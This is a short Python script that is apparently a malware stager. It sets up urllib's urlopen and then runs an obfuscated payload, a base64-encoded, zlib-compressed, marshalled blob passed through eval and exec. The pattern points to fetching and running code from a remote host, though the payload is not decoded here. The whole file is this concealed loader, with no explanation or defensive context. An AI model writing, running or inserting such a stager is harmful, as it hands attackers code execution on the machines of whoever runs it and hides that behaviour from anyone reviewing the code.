import sys,zlib,base64,marshal,json,urllib
if sys.version_info[0] > 2:
    from urllib import request
urlopen = urllib.request.urlopen if sys.version_info[0] > 2 else urllib.urlopen
exec(eval(marshal.loads(zlib.decompress(base64.b64decode(b'eJwrtWBgYCgtyskvSM3TUM8oKSmw0tfPyU9OzMnILy6xMjQyNtXX1y8uSUxPLSrWz0wL1iuoVNfUK0pNTNHQBABaLROB')))))